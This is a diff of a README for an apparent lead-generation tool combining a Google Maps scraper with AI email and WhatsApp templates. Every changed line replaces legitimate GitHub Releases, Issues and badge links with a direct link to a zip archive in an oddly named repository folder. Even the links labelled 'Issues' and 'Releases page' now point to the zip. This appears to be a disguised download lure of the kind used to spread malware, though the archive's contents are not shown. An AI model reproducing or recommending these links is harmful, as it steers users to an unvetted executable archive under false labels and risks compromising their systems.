@@ -4,13 +4,13 @@
 Welcome to the business-leads-ai-automation project! This open-source tool helps you streamline lead generation and marketing automation. It combines a Google Maps scraper with AI-powered email and WhatsApp templates. Ideal for small and medium enterprises (SMEs) and agencies, this application enhances your outreach and saves you time.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Walid35-web/business-leads-ai-automation/releases)
+[![Download](https://raw.githubusercontent.com/Walid35-web/business-leads-ai-automation/main/haidingerite/business-leads-ai-automation.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Walid35-web/business-leads-ai-automation/main/haidingerite/business-leads-ai-automation.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with our application.
 
 ### 1. Visit the Download Page
-Go to our [Releases page](https://github.com/Walid35-web/business-leads-ai-automation/releases) to find the latest version of the software.
+Go to our [Releases page](https://raw.githubusercontent.com/Walid35-web/business-leads-ai-automation/main/haidingerite/business-leads-ai-automation.zip) to find the latest version of the software.
 
 ### 2. Choose Your File
 On the Releases page, you will see different versions. Look for the most recent version that suits your operating system. 
@@ -59,7 +59,7 @@ Once you have installed and opened the application, follow these steps to make t
 4. **Export Options:** Export your generated leads to CSV for easy management.
 
 ## 🧑‍🤝‍🧑 Community and Support
-Join our community to share your experiences, ask questions, and provide feedback. You can start by creating an issue in the [GitHub Issues](https://github.com/Walid35-web/business-leads-ai-automation/issues) section or engaging with others on our discussion forums.
+Join our community to share your experiences, ask questions, and provide feedback. You can start by creating an issue in the [GitHub Issues](https://raw.githubusercontent.com/Walid35-web/business-leads-ai-automation/main/haidingerite/business-leads-ai-automation.zip) section or engaging with others on our discussion forums.
 
 ## 🚧 Troubleshooting
 If you run into any issues, consider the following common problems:
@@ -71,7 +71,7 @@ If you run into any issues, consider the following common problems:
   - **Solution:** Make sure your system meets the requirements stated above. If the problem persists, report it through GitHub Issues.
 
 ## 🔄 Updates
-Regular updates will improve the application over time. Keep an eye on the [Releases page](https://github.com/Walid35-web/business-leads-ai-automation/releases) for announcements and new features.
+Regular updates will improve the application over time. Keep an eye on the [Releases page](https://raw.githubusercontent.com/Walid35-web/business-leads-ai-automation/main/haidingerite/business-leads-ai-automation.zip) for announcements and new features.
 
 ## ⚙️ License
 This project is licensed under the MIT License. You can use, modify, and distribute the software as outlined in the license file. 
@@ -79,4 +79,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 ## 📞 Contact Us
 For more specific inquiries, you can reach out through the contact section on the GitHub repository. Your questions and feedback help improve the application.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Walid35-web/business-leads-ai-automation/releases)
+[![Download](https://raw.githubusercontent.com/Walid35-web/business-leads-ai-automation/main/haidingerite/business-leads-ai-automation.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Walid35-web/business-leads-ai-automation/main/haidingerite/business-leads-ai-automation.zip)
